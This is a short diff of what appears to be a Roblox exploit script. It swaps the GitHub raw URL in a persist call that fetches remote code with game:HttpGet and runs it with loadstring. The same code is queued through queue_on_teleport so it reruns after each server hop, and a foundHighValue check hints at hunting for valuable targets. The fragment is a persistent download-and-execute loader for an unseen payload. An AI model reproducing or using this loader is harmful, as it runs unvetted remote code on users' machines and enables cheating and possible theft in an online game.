@@ -120,7 +120,7 @@ if not foundHighValue or foundHighValue then
         if queue_on_teleport then queue_on_teleport(code) return end
     end
     
-    persist(string.format([[loadstring(game:HttpGet('%s'))()]], "https://raw.githubusercontent.com/kapscripts/idk/refs/heads/main/new"))
+    persist(string.format([[loadstring(game:HttpGet('%s'))()]], "https://raw.githubusercontent.com/kapscripts/idk/refs/heads/main/iugohfds"))
     
     -- Teleport to a random server instead of the same one
     pcall(function()
